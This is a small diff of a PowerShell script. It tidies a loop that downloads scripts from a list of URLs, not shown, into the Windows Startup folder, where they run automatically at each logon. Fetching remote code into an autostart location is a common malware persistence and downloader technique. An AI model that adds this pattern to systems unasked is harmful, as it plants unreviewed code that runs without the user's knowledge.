@@ -10,8 +10,6 @@ $scripts = @(
 
 $startup = $home + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
 
-$out = $startup
-
-$scripts | foreach {
+$scripts | ForEach-Object {
 	Invoke-WebRequest -Uri $_ -OutFile $($startup + $_.Split('/')[-1])
 }
